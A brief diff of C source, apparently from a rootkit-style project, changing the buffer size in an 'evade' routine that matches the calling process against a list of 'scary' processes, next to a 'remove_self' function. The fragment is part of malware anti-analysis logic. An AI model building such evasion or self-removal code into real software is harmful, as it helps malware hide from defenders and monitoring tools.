@@ -19,13 +19,12 @@ int remove_self(void){
 
 int evade(const char *filename, char *const argv[], char *const envp[]){
     char *scary_proc, *scary_path;
-    //char path[PATH_MAX];
 
     /* check scary_procs array */
     for(int i = 0; i < SCARY_PROCS_SIZE; i++){
         scary_proc = scary_procs[i];
 
-        char path[PATH_MAX/3];
+        char path[strlen(scary_proc) + 3];
         snprintf(path, sizeof(path), "*/%s", scary_proc);
 
         /* determine if calling process is a scary process, or someone
